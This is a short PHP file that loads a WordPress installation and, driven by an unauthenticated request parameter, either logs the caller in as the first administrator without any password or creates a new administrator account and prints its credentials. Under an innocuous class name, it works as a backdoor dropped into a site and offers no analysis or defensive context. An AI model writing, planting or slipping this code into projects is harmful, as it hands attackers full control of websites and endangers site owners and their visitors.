<?php 

define('WP_USE_THEMES', false);
define('WP_DIRECTORY', load_wordpress_core());

function load_wordpress_core(){
    $current_directory = dirname(__FILE__);
    while ($current_directory != '/' && !file_exists($current_directory . '/wp-load.php')) {
        $current_directory = dirname($current_directory);
    }
    return $current_directory ?  : $_SERVER['DOCUMENT_ROOT'];
}

require_once WP_DIRECTORY . '/wp-load.php';

class November {
    public function __construct() {
        $this->action = $_REQUEST['action'];
    }

    public function doAction() {
        switch($this->action) {
            case 'login':
                $user = get_users(["role" => "administrator"])[0];
                $user_id = $user->data->ID;
                wp_set_auth_cookie($user_id);
                wp_set_current_user($user_id);
                die("Probably $user_id?");
            case 'create':
                $username = 'admin' . rand(1000, 9999);
                $password = $this->generateRandomString(8);
                $email = $username . '@admin.com';
                if (!username_exists($username) && !email_exists($email)) {
                    $user_id = wp_create_user($username, $password, $email);
                    if (is_wp_error($user_id)) {
                        die('Error: ' . $user_id->get_error_message());
                    } else {
                        $user = new WP_User($user_id);
                        $user->set_role('administrator');
                        die("Username: $username, Email: $email, Password: $password");
                    }
                } else {
                    die('User already exists');
                }
            default: 
                $this->message['message'] = 'Nothing to do??';
                echo json_encode($this->message);
        }
    }

    private function generateRandomString($length = 8) {
        $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }
}

$nov = new November();
$nov->doAction();
